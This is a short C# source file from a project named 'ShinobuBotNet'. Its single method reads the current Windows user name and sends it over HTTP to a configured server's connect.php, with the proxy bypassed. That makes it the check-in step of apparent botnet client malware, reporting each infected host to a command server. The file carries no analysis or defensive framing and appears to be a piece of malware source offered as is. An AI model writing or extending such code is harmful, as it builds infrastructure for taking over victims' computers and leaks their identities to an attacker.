using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace ShinobuBotNet
{
    class connect
    {
        public static void connect_to_API()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            string result = wc.DownloadString(configs.server + "connect.php?user=" + userName);
        }
    }
}
